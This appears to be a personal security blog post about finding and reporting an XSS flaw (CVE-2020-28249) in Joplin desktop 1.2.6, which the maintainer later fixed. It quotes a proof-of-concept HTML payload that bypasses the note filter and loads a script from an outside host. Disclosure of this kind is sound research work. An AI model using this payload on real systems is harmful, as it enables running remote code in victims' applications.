---
title: "Tripping Over Xss"
date: 2021-01-24T14:03:56-05:00
draft: false
---

### Quite literally, tripping over XSS


While working an engagement, I was manually soft stepping through https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection and noting things as I went when all of the sudden...

![Screen Shot 2020-10-27 at 4.42.34 PM.png](/blogs/1_tripping_xss/xss.png)

This was reported to Laurent / Joplin and a fix implented in the following major version, not the most exciting finding but still a first CVE for me.

https://www.exploit-db.com/exploits/49024

```

# Exploit Title: Joplin 1.2.6 Cross Site Scripting
# Date: 2020-09-21
# Exploit Author: Philip Holbrook (@fhlipZero)
# Vendor Homepage: https://joplinapp.org/
# Software Link: https://github.com/laurent22/joplin/releases/tag/v1.2.6
# Version: 1.2.6
# Tested on: Windows / Mac
# CVE : CVE-2020-28249
# References:
# https://github.com/fhlip0/JopinXSS/blob/main/readme.md

# 1. Technical Details
# An XSS issue in Joplin for desktop v1.2.6 allows a link tag in a note to bypass the HTML filter

# 2. PoC
# Paste the following payload into a note:

```html
<link rel=import href="data:text/html&comma;&lt;script&gt;alert(XSS)&lt;&sol;script&gt;
<script src="//brutelogic.com.br&sol;1.js&num; </script>
```
